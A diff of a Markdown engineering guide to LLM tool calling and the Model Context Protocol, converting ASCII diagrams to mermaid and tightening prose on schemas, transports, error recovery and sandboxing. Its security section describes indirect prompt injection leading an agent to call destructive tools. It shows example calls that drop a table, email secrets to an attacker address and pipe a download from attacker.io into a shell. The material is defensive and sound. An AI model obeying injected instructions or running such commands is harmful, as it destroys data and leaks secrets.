@@ -4,95 +4,63 @@
 
 ---
 
-```
-                                  ┌────────────────────────────────────────────────────────┐
-                                  │             THE MODEL CONTEXT PROTOCOL & TOOL ENGINE   │
-                                  │   JSON-RPC 2.0 • Stdio/SSE • FastMCP • Semantic Kernel │
-                                  └───────────────────────────┬────────────────────────────┘
-                                                              │
-                     ┌────────────────────────────────────────┴────────────────────────────────────────┐
-                     ▼                                                                                 ▼
-     ┌───────────────────────────────┐                                                 ┌───────────────────────────────┐
-     │      DISCOVERY & SCHEMAS      │                                                 │     TRANSPORT & PROTOCOL      │
-     │  • JSON Schema (Draft 2020-12)│                                                 │  • JSON-RPC 2.0 Wire Messages │
-     │  • Pydantic v2 / Zod Contracts│                                                 │  • Stdio (Subprocess / Pipe)  │
-     │  • Tool/Resource Declarations │                                                 │  • SSE / HTTP (Microservices) │
-     │  • Parameter Validation Rules │                                                 │  • Capability Negotiation     │
-     └───────────────┬───────────────┘                                                 └───────────────┬───────────────┘
-                     │                                                                                 │
-                     └────────────────────────────────────────┬────────────────────────────────────────┘
-                                                              ▼
-                                  ┌────────────────────────────────────────────────────────┐
-                                  │             HOST ORCHESTRATION & GATEWAY               │
-                                  │  Model Selection ➔ Tool Filtering ➔ Interception Gate  │
-                                  │          ➔ Reverse Sampling (Host LLM Calls)           │
-                                  └───────────────────────────┬────────────────────────────┘
-                                                              │
-                     ┌────────────────────────────────────────┴────────────────────────────────────────┐
-                     ▼                                                                                 ▼
-     ┌───────────────────────────────┐                                                 ┌───────────────────────────────┐
-     │    DEFENSIVE EXECUTION RUNTIME│                                                 │      GOVERNANCE & TRUST       │
-     │  • Sandboxed Docker / gVisor  │                                                 │  • Human-in-the-Loop (HITL)   │
-     │  • Granular RBAC Permissions  │                                                 │  • Two-Phase Mutating Gates   │
-     │  • Token Budget & Truncation  │                                                 │  • Blast Radius Containment   │
-     │  • Circuit Breaker Anti-Loop  │                                                 │  • OpenTelemetry Audit Trail  │
-     └───────────────┬───────────────┘                                                 └───────────────┬───────────────┘
-                     │                                                                                 │
-                     └────────────────────────────────────────┬────────────────────────────────────────┘
-                                                              ▼
-                                  ┌────────────────────────────────────────────────────────┐
-                                  │            GROUNDED REASONING & RECOVERY               │
-                                  │   Strict Error Feedback ➔ Self-Healing ➔ Next Action   │
-                                  └────────────────────────────────────────────────────────┘
+```mermaid
+flowchart TD
+    subgraph Core["THE MODEL CONTEXT PROTOCOL & TOOL ENGINE"]
+        C1["JSON-RPC 2.0 • Stdio/SSE • FastMCP • Semantic Kernel"]
+    end
+    
+    subgraph Discovery["DISCOVERY & SCHEMAS"]
+        D1["• JSON Schema (Draft 2020-12)<br>• Pydantic v2 / Zod Contracts<br>• Tool/Resource Declarations<br>• Parameter Validation Rules"]
+    end
+    
+    subgraph Transport["TRANSPORT & PROTOCOL"]
+        T1["• JSON-RPC 2.0 Wire Messages<br>• Stdio (Subprocess / Pipe)<br>• SSE / HTTP (Microservices)<br>• Capability Negotiation"]
+    end
+    
+    subgraph Host["HOST ORCHESTRATION & GATEWAY"]
+        H1["Model Selection ➔ Tool Filtering ➔ Interception Gate<br>➔ Reverse Sampling (Host LLM Calls)"]
+    end
+    
+    subgraph Defensive["DEFENSIVE EXECUTION RUNTIME"]
+        Def1["• Sandboxed Docker / gVisor<br>• Granular RBAC Permissions<br>• Token Budget & Truncation<br>• Circuit Breaker Anti-Loop"]
+    end
+    
+    subgraph Governance["GOVERNANCE & TRUST"]
+        G1["• Human-in-the-Loop (HITL)<br>• Two-Phase Mutating Gates<br>• Blast Radius Containment<br>• OpenTelemetry Audit Trail"]
+    end
+    
+    subgraph Grounded["GROUNDED REASONING & RECOVERY"]
+        Gr1["Strict Error Feedback ➔ Self-Healing ➔ Next Action"]
+    end
+
+    Core --> Discovery
+    Core --> Transport
+    Discovery --> Host
+    Transport --> Host
+    Host --> Defensive
+    Host --> Governance
+    Defensive --> Grounded
+    Governance --> Grounded
 ```
 
 ---
 
-> ### 🏷️ Curriculum Taxonomy & Classification for Senior Engineers
-> - `[MUST-HAVE]` 🔴: Core production architecture, sizing formulas, and interview essentials.
-> - `[GOOD-TO-HAVE]` 🟡: Advanced scaling, hardware acceleration, and optimization techniques.
-> - `[KNOWLEDGE-BASE]` 🔵: Conceptual understanding only (skip coding from scratch).
+> **Taxonomy Note**: Refer to the [main README](../README.md) for curriculum classification symbols (`[MUST-HAVE]` 🔴, `[GOOD-TO-HAVE]` 🟡, `[KNOWLEDGE-BASE]` 🔵).
 
 ---
 
 ## 📑 Table of Contents
 
 1. [Executive Summary & Lead Mental Model](#1-executive-summary--lead-mental-model)
-   - [The Passive Predictor vs. Autonomous Executor Paradigm](#the-passive-predictor-vs-autonomous-executor-paradigm)
-   - [The "ODBC / USB-C Moment" for AI Systems](#the-odbc--usb-c-moment-for-ai-systems)
-   - [The Senior Architect's Mental Model](#the-senior-architects-mental-model)
-   - [The 3-Tier Execution Topology](#the-3-tier-execution-topology)
 2. [Why This Matters for Senior/Lead Developers](#2-why-this-matters-for-seniorlead-developers)
-   - [Eliminating the M × N Integration Sprawl](#eliminating-the-m-times-n-integration-sprawl)
-   - [Protocol-Driven Interoperability vs. Bespoke SDK Locks](#protocol-driven-interoperability-vs-bespoke-sdk-locks)
-   - [Deterministic Schema Contracts & Strict Type Boundaries](#deterministic-schema-contracts--strict-type-boundaries)
-   - [Sandboxing, Blast Radius Containment & Privilege Isolation](#sandboxing-blast-radius-containment--privilege-isolation)
-   - [Graceful Degradation & Self-Healing Resilience in Loops](#graceful-degradation--self-healing-resilience-in-loops)
 3. [Deep-Dive Engineering & Architectural Primitives](#3-deep-dive-engineering--architectural-primitives)
-   - [3.1 Function Calling Primitives & Wire Protocol `[MUST-HAVE]` 🔴](#31-function-calling-primitives--wire-protocol-must-have-)
-   - [3.2 Model Context Protocol (MCP) Architecture & Specifications `[MUST-HAVE]` 🔴](#32-model-context-protocol-mcp-architecture--specifications-must-have-)
-   - [3.3 Core MCP Primitives: Tools, Resources, Prompts & Sampling `[MUST-HAVE]` 🔴](#33-core-mcp-primitives-tools-resources-prompts--sampling-must-have-)
-   - [3.4 Building Enterprise MCP Servers (Python, TypeScript, C#) `[GOOD-TO-HAVE]` 🟡](#34-building-enterprise-mcp-servers-python-typescript-c-good-to-have-)
-   - [3.5 Integrating MCP with Production Hosts `[GOOD-TO-HAVE]` 🟡](#35-integrating-mcp-with-production-hosts-good-to-have-)
-   - [3.6 Tool Enforcement, Constrained Decoding & Error Recovery `[MUST-HAVE]` 🔴](#36-tool-enforcement-constrained-decoding--error-recovery-must-have-)
-   - [3.7 Production Sandboxing, Security & Governance `[MUST-HAVE]` 🔴](#37-production-sandboxing-security--governance-must-have-)
 4. [System Architecture & Visual Flows](#4-system-architecture--visual-flows)
-   - [MCP Client-Host-Server Architecture with Stdio & SSE Transports](#mcp-client-host-server-architecture-with-stdio--sse-transports)
-   - [Tool Execution, Verification & Error Recovery Cycle](#tool-execution-verification--error-recovery-cycle)
 5. [Comparative Analysis & Tradeoff Matrices](#5-comparative-analysis--tradeoff-matrices)
-   - [Standard Provider Function Calling vs. Model Context Protocol (MCP)](#standard-provider-function-calling-vs-model-context-protocol-mcp)
-   - [MCP Transports: Stdio vs. Server-Sent Events (SSE) / Stream HTTP](#mcp-transports-stdio-vs-server-sent-events-sse--stream-http)
 6. [Production Failure Modes & Anti-Patterns](#6-production-failure-modes--anti-patterns)
-   - [1. Tool Parameter Hallucination & Type Corruption](#1-tool-parameter-hallucination--type-corruption)
-   - [2. Unhandled Exceptions Crashing the Agentic Reasoner](#2-unhandled-exceptions-crashing-the-agentic-reasoner)
-   - [3. Infinite Execution Loops & Oscillation Deadlocks](#3-infinite-execution-loops--oscillation-deadlocks)
-   - [4. Exposing Unrestricted Mutating Operations Without Approval Gates](#4-exposing-unrestricted-mutating-operations-without-approval-gates)
-   - [5. Tool Output Context Bombing (Denial of Wallet)](#5-tool-output-context-bombing-denial-of-wallet)
-7. [Enterprise Production Code Implementations `[MUST-HAVE]` 🔴](#7-enterprise-production-code-implementations-must-have-)
-   - [Python: Production FastMCP Server for Database Schema Inspection & Safe Querying](#python-production-fastmcp-server-for-database-schema-inspection--safe-querying)
-   - [C# / .NET 9: Enterprise Function Calling with Microsoft Semantic Kernel & Auto-Invocation Filters](#c--net-9-enterprise-function-calling-with-microsoft-semantic-kernel--auto-invocation-filters)
+7. [Enterprise Production Code Implementations [MUST-HAVE] 🔴](#7-enterprise-production-code-implementations-must-have-)
 8. [Verified Curated Resources & Reference Index](#8-verified-curated-resources--reference-index)
-9. [Capstone Engineering Challenge `[MUST-HAVE]` 🔴](#9-capstone-engineering-challenge-must-have-)
+9. [Capstone Engineering Challenge: The Production MCP Tool Server [MUST-HAVE] 🔴](#9-capstone-engineering-challenge-the-production-mcp-tool-server-must-have-)
 
 ---
 
@@ -100,29 +68,25 @@
 
 ### The Passive Predictor vs. Autonomous Executor Paradigm
 
-In classical software systems, computation is deterministic, explicit, and imperatively coded. When Large Language Models (LLMs) emerged, they initially operated as **isolated statistical calculators**—predicting the most likely next token conditioned on a static prompt prefix. A foundation model in isolation is blind, deaf, and paralyzed:
+In classical software systems, computation is deterministic, explicit, and imperatively coded. When Large Language Models (LLMs) emerged, they initially operated as **isolated statistical calculators**—predicting the most likely next token conditioned on a static prompt prefix. An isolated foundation model lacks:
 - It has no access to real-time information beyond its training cutoff.
 - It cannot interact with enterprise state (databases, ticketing systems, Git repos, internal APIs).
 - It cannot execute logic that requires mathematical precision, transactions, or stateful persistence.
 
-```
-┌───────────────────────────────────────┐         ┌───────────────────────────────────────┐
-│     STAGE 1: PASSIVE PREDICTOR        │         │     STAGE 2: AUTONOMOUS EXECUTOR      │
-│                                       │         │                                       │
-│   User Prompt ──► [LLM Weights]       │         │   User Prompt ──► [LLM Weights]       │
-│                         │             │         │                         │             │
-│                         ▼             │         │                         ▼             │
-│                 Unverified Text       │         │                  Emits Tool Call      │
-│                                       │         │                         │             │
-│  • High hallucination risk            │         │                         ▼             │
-│  • Zero enterprise integration        │         │              [Deterministic Runtime]  │
-│  • Static knowledge boundary          │         │                         │             │
-│  • Cannot inspect or mutate state     │         │                         ▼             │
-│                                       │         │              Executes API / Database  │
-│                                       │         │                         │             │
-│                                       │         │                         ▼             │
-│                                       │         │              Returns Grounded Reality │
-└───────────────────────────────────────┘         └───────────────────────────────────────┘
+```mermaid
+flowchart TD
+    subgraph Passive["STAGE 1: PASSIVE PREDICTOR"]
+        P_User["User Prompt"] --> P_Model["LLM Weights"]
+        P_Model --> P_Out["Unverified Text<br>• High hallucination risk<br>• Zero enterprise integration<br>• Static knowledge boundary<br>• Cannot inspect or mutate state"]
+    end
+    
+    subgraph Autonomous["STAGE 2: AUTONOMOUS EXECUTOR"]
+        A_User["User Prompt"] --> A_Model["LLM Weights"]
+        A_Model --> A_Tool["Emits Tool Call"]
+        A_Tool --> A_Runtime["Deterministic Runtime"]
+        A_Runtime --> A_Exec["Executes API / Database"]
+        A_Exec --> A_Return["Returns Grounded Reality"]
+    end
 ```
 
 The transition from **Passive Predictor** to **Autonomous Executor** occurs when the LLM is coupled with an execution runtime via **Tool Calling** (Function Calling) and standardized protocols. Under this paradigm:
@@ -140,21 +104,33 @@ Between 2023 and late 2024, every LLM provider and agent framework rolled out pr
 
 This resulted in the classic M × N architectural trap: if you had $M$ model providers and $N$ enterprise data sources or tools, you had to write and maintain $M \times N$ custom connectors.
 
-```
-       BESPOKE INTEGRATION SPRAWL (M x N)              THE STANDARDIZED PROTOCOL (M + N)
-
-    Models                 Enterprise Tools          Models                 Enterprise Tools
-  ┌─────────┐               ┌──────────────┐       ┌─────────┐               ┌──────────────┐
-  │ OpenAI  │───┬───┬───┬──►│ PostgreSQL   │       │ OpenAI  │──┐            │ PostgreSQL   │
-  └─────────┘   │   │   │   └──────────────┘       └─────────┘  │            └──────────────┘
-  ┌─────────┐   │   │   │   ┌──────────────┐       ┌─────────┐  │   MCP      ┌──────────────┐
-  │ Claude  │───┼───┼───┼──►│ Jira / Git   │       │ Claude  │──┼──[BUS]────►│ Jira / Git   │
-  └─────────┘   │   │   │   └──────────────┘       └─────────┘  │            └──────────────┘
-  ┌─────────┐   │   │   │   ┌──────────────┐       ┌─────────┐  │            ┌──────────────┐
-  │ Gemini  │───┴───┼───┼──►│ Kubernetes   │       │ Gemini  │──┘            │ Kubernetes   │
-  └─────────┘       │   │   └──────────────┘       └─────────┘               └──────────────┘
-                    ▼   ▼                                                           ▲
-           Bespoke Glue Code Hell                                      Standard JSON-RPC 2.0
+```mermaid
+flowchart LR
+    subgraph Bespoke["BESPOKE INTEGRATION SPRAWL (M x N)"]
+        direction LR
+        O1["OpenAI"] --> DB1["PostgreSQL"]
+        O1 --> Jira1["Jira / Git"]
+        O1 --> K8s1["Kubernetes"]
+        
+        C1["Claude"] --> DB1
+        C1 --> Jira1
+        C1 --> K8s1
+        
+        G1["Gemini"] --> DB1
+        G1 --> Jira1
+        G1 --> K8s1
+    end
+    
+    subgraph MCP["THE STANDARDIZED PROTOCOL (M + N)"]
+        direction LR
+        O2["OpenAI"] --> Bus["MCP BUS"]
+        C2["Claude"] --> Bus
+        G2["Gemini"] --> Bus
+        
+        Bus --> DB2["PostgreSQL"]
+        Bus --> Jira2["Jira / Git"]
+        Bus --> K8s2["Kubernetes"]
+    end
 ```
 
 The release of the **Model Context Protocol (MCP)** by Anthropic in November 2024 represents the **ODBC / USB-C moment** for artificial intelligence:
@@ -173,96 +149,57 @@ Senior AI Architects approach tool calling and context integration through four 
 
 ### The 3-Tier Execution Topology
 
-```
-┌────────────────────────────────────────────────────────────────────────────────────────┐
-│ 1. THE HOST (Orchestrator & Presentation)                                              │
-│    • Claude Desktop, Cursor, Google ADK, Custom Enterprise Web Application             │
-│    • Coordinates user session, manages LLM API calls, handles UI rendering             │
-│    • Enforces enterprise policy, authenticates users, and hosts MCP Clients            │
-└──────────────────────────────────────────┬─────────────────────────────────────────────┘
-                                           │  In-Process / IPC
-                                           ▼
-┌────────────────────────────────────────────────────────────────────────────────────────┐
-│ 2. THE MCP CLIENT (Protocol Gateway & Router)                                          │
-│    • Maintains 1-to-N connections with local or remote MCP Servers                     │
-│    • Discovers tools, resources, and prompt templates during handshake                 │
-│    • Transforms model tool calls into JSON-RPC 2.0 messages over standard transports   │
-└──────────────────────────────────────────┬─────────────────────────────────────────────┘
-                                           │  Transport: Stdio (Pipes) OR SSE (HTTP/TCP)
-                                           ▼
-┌────────────────────────────────────────────────────────────────────────────────────────┐
-│ 3. THE MCP SERVER (Context & Execution Provider)                                       │
-│    • Implements standard JSON-RPC 2.0 endpoints                                        │
-│    • Exposes Tools (actions), Resources (data feeds), and Prompts (reusable templates) │
-│    • Interacts with Systems of Record: Postgres, Kafka, Snowflake, GitHub, Kubernetes  │
-└────────────────────────────────────────────────────────────────────────────────────────┘
+```mermaid
+flowchart TD
+    Host["1. THE HOST (Orchestrator & Presentation)<br>• Claude Desktop, Cursor, Google ADK, Custom Enterprise Web Application<br>• Coordinates user session, manages LLM API calls, handles UI rendering<br>• Enforces enterprise policy, authenticates users, and hosts MCP Clients"]
+    Client["2. THE MCP CLIENT (Protocol Gateway & Router)<br>• Maintains 1-to-N connections with local or remote MCP Servers<br>• Discovers tools, resources, and prompt templates during handshake<br>• Transforms model tool calls into JSON-RPC 2.0 messages over standard transports"]
+    Server["3. THE MCP SERVER (Context & Execution Provider)<br>• Implements standard JSON-RPC 2.0 endpoints<br>• Exposes Tools (actions), Resources (data feeds), and Prompts (reusable templates)<br>• Interacts with Systems of Record: Postgres, Kafka, Snowflake, GitHub, Kubernetes"]
+    
+    Host -- "In-Process / IPC" --> Client
+    Client -- "Transport: Stdio (Pipes) OR SSE (HTTP/TCP)" --> Server
 ```
 
 ---
 
 ## 2. Why This Matters for Senior/Lead Developers
 
+| Production Challenge | Root Cause | Enterprise Impact | Architectural Defense |
+|---|---|---|---|
+| **$M \times N$ Integration Sprawl** | Bespoke vendor tool APIs (OpenAI, Claude, Gemini). | High connector development & maintenance overhead. | Standardize on **Model Context Protocol (MCP)** ($M + N$ connectors). |
+| **Vendor SDK Lock-in** | Proprietary assistant runtimes and hosted tool stores. | Cloud vendor lock-in; inability to route across models. | Protocol-driven JSON-RPC 2.0 wire architecture over stdio/SSE. |
+| **Schema Drift & Deserialization Errors** | Probabilistic next-token sampling emitting invalid formats. | Backend deserialization crashes (`JsonException`, `DLQ` floods). | Enforce **JSON Schema (Draft 2020-12)** with **Constrained Decoding** (`strict: true`). |
+| **Confused Deputy & Unbounded Blast Radius** | Indirect prompt injection hijacking privileged tools. | Unauthorized data mutations, dropped tables, data exfiltration. | **Least Privilege IAM**, container sandboxing (gVisor/WASM), and **Two-Phase HITL** gates. |
+| **Unhandled Runtime Faults** | APIs timing out or throwing exceptions in loops. | Agentic crashes and dropped conversation history. | **Closed-loop Error Recovery** returning structured `is_error: true` payloads. |
+
 ### Eliminating the M × N Integration Sprawl
-
-Without an industry standard, adding a new internal microservice to your AI workflows requires building and testing distinct wrappers for every model family in your tech stack. If your enterprise uses OpenAI for general customer support, Claude for internal software engineering, and Gemini for multimodal document analysis, adding a ServiceNow incident-logging tool forces you to write and maintain three distinct tool-calling adapters.
-
-With **MCP**, you author the ServiceNow integration **once** as an MCP server. All host applications and models query its `tools/list` schema over JSON-RPC 2.0 and invoke it using universal payloads. Adding a new tool to your enterprise fleet becomes an $O(1)$ operation instead of $O(M)$.
+Without an open standard, integrating $M$ model providers with $N$ enterprise backends demands $M \times N$ bespoke adapters. Standardizing on **MCP** collapses integration complexity to $M + N$: author the service integration once as an MCP server, and every compliant Host (Claude Desktop, Cursor, Google ADK, internal gateways) discovers and invokes it dynamically over JSON-RPC 2.0.
 
 ### Protocol-Driven Interoperability vs. Bespoke SDK Locks
-
-Proprietary vendor frameworks (such as OpenAI Assistants API / Vector Stores) create extreme vendor lock-in:
-- Your business logic, file storage, and execution history are held inside proprietary cloud silos.
-- Migrating to a more cost-effective or privacy-compliant model requires refactoring entire software layers.
-- MCP is an open-source, vendor-agnostic protocol. It uses standard JSON-RPC 2.0, meaning your backend MCP servers can be written in Python, C#, TypeScript, Go, or Rust, and hosted on-premises, inside private VPCs, or in serverless containers.
+Vendor-specific abstractions (e.g. OpenAI Assistants API) couple business execution logic to closed cloud silos. MCP decouples tool execution from model providers. Servers operate as polyglot microservices (Python, C#, TypeScript, Go) deployable in private VPCs, air-gapped on-premise infrastructure, or serverless containers.
 
 ### Deterministic Schema Contracts & Strict Type Boundaries
-
-A primary failure mode in early AI integrations was **schema drift**—the model generating an integer when an ISO 8601 timestamp string was required, or using camelCase when the API expected snake_case.
-
-Modern tool architectures enforce **JSON Schema (Draft 2020-12)** specifications with **Constrained Decoding** (such as OpenAI's Structured Outputs `strict: true` or Anthropic's strict tool schemas). By compiling Pydantic v2 (Python) or C# record types into strict JSON schemas, the LLM inference engine constrains its output logits, mathematically guaranteeing that the emitted tokens conform to the schema syntax.
+Foundation models without constrained decoding exhibit schema drift (invalid types, hallucinated properties, camelCase vs snake_case mismatches). Modern runtimes compile Pydantic v2 (Python) or C# records into strict JSON Schemas (Draft 2020-12) with `"additionalProperties": false`. Inference engines use Finite State Machine (FSM) logit masking to mathematically guarantee valid tokens.
 
 ### Sandboxing, Blast Radius Containment & Privilege Isolation
 
-```
-┌────────────────────────────────────────────────────────────────────────────────┐
-│                          DEFENSE-IN-DEPTH ARCHITECTURE                         │
-│                                                                                │
-│   [Untrusted Model]                                                            │
-│          │                                                                     │
-│          ▼ (Emits Tool Call JSON)                                              │
-│   [Host Policy Interceptor]                                                    │
-│          │                                                                     │
-│          ├──► Passes Read-Only Check? ──► [Direct Local Execution]             │
-│          │                                                                     │
-│          └──► Contains Mutation / Write / Execution Command?                   │
-│                     │                                                          │
-│                     ├──► [Human-in-the-Loop Approval Modal]                    │
-│                     │                                                          │
-│                     └──► [Isolated MicroVM / Docker Container]                 │
-│                                • gVisor / Firecracker runtime                  │
-│                                • Ephemeral filesystem (tmpfs)                  │
-│                                • Egress firewall (No metadata IP access)       │
-└────────────────────────────────────────────────────────────────────────────────┘
+```mermaid
+flowchart TD
+    subgraph Defense["DEFENSE-IN-DEPTH ARCHITECTURE"]
+        Model["Untrusted Model"] -->|Emits Tool Call JSON| Interceptor["Host Policy Interceptor"]
+        Interceptor -->|Passes Read-Only Check?| Direct["Direct Local Execution"]
+        Interceptor -->|Contains Mutation / Write / Execution Command?| Gate["Decision Gate"]
+        Gate --> HITL["Human-in-the-Loop Approval Modal"]
+        Gate --> Sandbox["Isolated MicroVM / Docker Container<br>• gVisor / Firecracker runtime<br>• Ephemeral filesystem (tmpfs)<br>• Egress firewall (No metadata IP access)"]
+    end
 ```
 
-When an LLM has access to a command shell, SQL database, or email client, an attacker can exploit **Indirect Prompt Injection** (e.g., placing malicious instructions inside a scraped webpage or customer ticket) to trick the model into calling destructive tools:
-- `execute_sql("DROP TABLE customers;")`
-- `send_email(to="attacker@darkweb.io", body=system_secrets)`
-- `run_terminal_command("curl attacker.io | sh")`
-
-Senior Architects prevent catastrophic compromise by instituting:
-1. **Principle of Least Privilege**: Exposing granular, read-only tools by default. Never expose generic `run_bash_command` or arbitrary `execute_raw_sql` to an untrusted model.
-2. **Blast Radius Sandboxing**: Executing high-risk tools inside isolated environments (Docker containers with read-only root filesystems, gVisor sandboxes, or WebAssembly runtimes) with blocked local network access.
-3. **Two-Phase Approval Gates**: Requiring an authenticated human signature before committing irreversible side effects (Human-in-the-Loop).
+When an agent interacts with external systems, untrusted data (scraped web pages, tickets, emails) can trigger **Indirect Prompt Injection** (`execute_sql("DROP TABLE customers;")`). Production architectures enforce:
+1. **Principle of Least Privilege**: Expose granular, read-only tools by default. Never expose unconstrained shell or raw SQL execution.
+2. **Blast Radius Sandboxing**: Execute untrusted code inside isolated microVMs (gVisor `runsc`, Firecracker) or WASM with blocked network metadata endpoints (`169.254.169.254`).
+3. **Two-Phase Approval Gates**: Mutating actions emit ephemeral, cryptographically signed confirmation tokens requiring human sign-off before committing.
 
 ### Graceful Degradation & Self-Healing Resilience in Loops
-
-In production, tool calls will fail:
-- A third-party SaaS endpoint returns HTTP 503 or 429 Too Many Requests.
-- A database transaction deadlocks or times out.
-- The model passes a semantic parameter that fails business validation (e.g., an end date prior to a start date).
-
-Amateur agent implementations crash or raise unhandled exceptions, destroying the conversational context. Production architectures intercept the exception, serialize it into a structured error object, and pass it back into the context window as a `tool_result` with `is_error: true`. This allows the LLM to inspect the error message, correct its parameterization, and re-attempt execution dynamically.
+When tools encounter HTTP 429/503 errors, deadlocks, or business validation errors, catching and serializing the failure into a structured payload (`{"role": "tool", "is_error": true, "content": "..."}`) keeps the agent loop intact. The model reads the diagnostic error, adjusts its arguments, and self-heals in-context without process termination.
 
 ---
 
@@ -279,23 +216,17 @@ Foundation models do not execute code. Function calling is an orchestration conv
 3. **Special Stop Tokens**: When the tool argument generation finishes, the model emits a specific stop token (e.g., `<|eom_id|>`, `</tool_call>`, or a specific finish reason `tool_calls`).
 4. **Host Interception**: The inference API pauses generation, returning the payload with `finish_reason: "tool_calls"`. The host executes the underlying code, injects the output as a `role: "tool"` message, and requests a continuation.
 
-```
-       AUTOREGRESSIVE TOOL GENERATION & INTERCEPTION SEQUENCE
-
-  Model Context:
-  System: You have tool 'get_user(user_id: int)'.
-  User: Get info for user 42.
-  Assistant: [Emits Token Sequence] ──► {"name": "get_user", "arguments": {"user_id": 42}}
-                                                          │
-                                             Model stops with finish_reason='tool_calls'
-                                                          │
-  Host Runtime Intercepts ────────────────────────────────┘
-  Runs: db.users.find(id=42)
-  Returns: {"id": 42, "name": "Alice", "role": "Architect"}
-                                                          │
-  Host appends Tool Response to Context ──────────────────┘
-  Tool: {"id": 42, "name": "Alice", "role": "Architect"}
-  Assistant: [Resumes Generation] ──► User Alice is an enterprise Architect.
+```mermaid
+sequenceDiagram
+    participant Model
+    participant Host
+    
+    Model->>Host: Emits Tool Call Sequence: {"name": "get_user", "arguments": {"user_id": 42}}
+    Note over Model: Stops with finish_reason='tool_calls'
+    Host->>Host: Runs: db.users.find(id=42)
+    Note over Host: Returns: {"id": 42, "name": "Alice", "role": "Architect"}
+    Host->>Model: Appends Tool Response to Context
+    Note over Model: Resumes Generation: User Alice is an enterprise Architect.
 ```
 
 #### JSON Schema Declarations (Draft 2020-12)
@@ -459,17 +390,14 @@ MCP abstracts the physical transport layer. The two primary production transport
 
 The Model Context Protocol divides AI capabilities into four distinct, orthogonally designed primitives:
 
-```
-┌────────────────────────────────────────────────────────────────────────────────────────┐
-│                                 CORE MCP PRIMITIVES                                    │
-├──────────────────────────┬─────────────────────────────┬───────────────────────────────┤
-│ PRIMITIVE                │ OPERATIONAL SEMANTICS       │ INITIATOR                     │
-├──────────────────────────┼─────────────────────────────┼───────────────────────────────┤
-│ 1. Tools                 │ Dynamic Executable Actions  │ Model (via Client Request)    │
-│ 2. Resources             │ Passive Context / Documents │ Client / User / Host App      │
-│ 3. Prompts               │ Parameterized Templates     │ User / Slash Commands         │
-│ 4. Sampling              │ Reverse LLM Execution       │ Server (via Host Request)     │
-└──────────────────────────┴─────────────────────────────┴───────────────────────────────┘
+```mermaid
+flowchart TD
+    subgraph Primitives["CORE MCP PRIMITIVES"]
+        T["1. Tools: Dynamic Executable Actions<br>Initiator: Model"]
+        R["2. Resources: Passive Context / Documents<br>Initiator: Client / User / Host App"]
+        P["3. Prompts: Parameterized Templates<br>Initiator: User / Slash Commands"]
+        S["4. Sampling: Reverse LLM Execution<br>Initiator: Server"]
+    end
 ```
 
 #### 1. Tools (Actions & Mutations)
@@ -630,34 +558,24 @@ Even with constrained decoding, semantic business errors occur (e.g., querying a
 
 Amateur code crashes the agent. Production architectures use **Closed-Loop Error Recovery**:
 
-```
-┌────────────────────────────────────────────────────────────────────────────────┐
-│                        SELF-HEALING RETRY ARCHITECTURE                         │
-│                                                                                │
-│    [LLM Context]                                                               │
-│          │                                                                     │
-│          ▼ Emits Call: query_user(id="INVALID-99")                             │
-│    [Tool Interceptor]                                                          │
-│          │                                                                     │
-│          ▼ Executes Function                                                   │
-│    [Database / API] ──► Returns Error: "User INVALID-99 not found. Did you     │
-│                                         mean 'USR-9901'?"                      │
-│          │                                                                     │
-│          ▼ Intercepts Error & Constructs Tool Result                           │
-│    [Tool Result Payload]                                                       │
-│    {                                                                           │
-│      "role": "tool",                                                           │
-│      "name": "query_user",                                                     │
-│      "content": "ERROR_VALIDATION: User ID 'INVALID-99' does not exist.",      │
-│      "is_error": true                                                          │
-│    }                                                                           │
-│          │                                                                     │
-│          ▼ Injected into Context without Crashing                              │
-│    [LLM Evaluates Error]                                                       │
-│          │                                                                     │
-│          ▼ Emits Corrected Call: query_user(id="USR-9901")                     │
-│    [Success] ──► Produces Final Grounded Answer                                │
-└────────────────────────────────────────────────────────────────────────────────┘
+```mermaid
+sequenceDiagram
+    autonumber
+    participant LLM as LLM Context
+    participant Interceptor as Tool Interceptor
+    participant DB as Database / API
+
+    LLM->>Interceptor: Emits Call: query_user(id="INVALID-99")
+    Interceptor->>DB: Executes Function
+    DB-->>Interceptor: Returns Error: "User INVALID-99 not found. Did you mean 'USR-9901'?"
+    Note over Interceptor: Constructs Tool Result Payload<br/>{"role": "tool", "name": "query_user", "is_error": true}
+    Interceptor->>LLM: Injected into Context without Crashing
+    Note over LLM: Evaluates Error Payload
+    LLM->>Interceptor: Emits Corrected Call: query_user(id="USR-9901")
+    Interceptor->>DB: Executes Function
+    DB-->>Interceptor: Returns Success Payload
+    Interceptor-->>LLM: Valid Grounded Result
+    Note over LLM: Produces Final Grounded Answer
 ```
 
 #### Tool Output Truncation & Token Budgeting
@@ -682,26 +600,12 @@ the model may comply, acting as a **Confused Deputy** on behalf of the attacker 
 
 To deploy agentic tools in mission-critical enterprise environments, enforce four layers of defense:
 
-```
-  Layer 1: Identity & Scoping
-  • Authenticate user identity at the Host level.
-  • Pass User Identity tokens to MCP servers (no global shared "superadmin" service accounts).
-
-  Layer 2: Schema Level Least Privilege
-  • Separate tools into Query (Read-Only) and Mutation (State-Altering).
-  • Never expose raw code interpreters or arbitrary shell execution to unconstrained models.
-
-  Layer 3: Human-in-the-Loop (HITL) Gateways
-  • Destructive operations (DELETE, DROP, UPDATE, financial transactions) require explicit approval.
-  • Two-phase execution: Server emits a "Proposed Action Ticket"; Host prompts human user; only executes upon signed confirmation.
-
-  Layer 4: Sandboxed Isolation Runtimes
-  • When code execution tools (Python, Bash, Node) are required, run them inside isolated microVMs or containers:
-    - Docker with `--read-only` root, `--cap-drop=ALL`, and CPU/memory limits.
-    - gVisor (runsc) or Firecracker microVMs.
-    - Dedicated WebAssembly (Wasm) runtimes.
-    - Strictly block outbound networking to cloud metadata endpoints (e.g., 169.254.169.254).
-```
+| Defense Layer | Security Mechanism | Production Enforcement |
+|---|---|---|
+| **Layer 1: Identity & Scoping** | Host-level authentication & token forwarding | Pass authenticated user identity tokens to MCP servers; eliminate shared superadmin service accounts. |
+| **Layer 2: Schema Least Privilege** | Read/write role segregation | Disjoin Query (read-only) from Mutation (state-altering) tools. Prohibit unconstrained shell or raw SQL execution. |
+| **Layer 3: Human-in-the-Loop (HITL)** | Two-phase commit with cryptographic tickets | Destructive operations (`DROP`, `DELETE`, financial transfers) emit approval tickets requiring explicit human confirmation. |
+| **Layer 4: Sandboxed Isolation** | Ephemeral microVMs & container sandboxes | Run code execution in Docker (`--read-only`, `--cap-drop=ALL`), gVisor (`runsc`), or WASM with blocked metadata IPs (`169.254.169.254`). |
 
 ---
 
@@ -941,11 +845,12 @@ async def query_erp_invoice(invoice_id: str) -> str:
 #### Root Cause
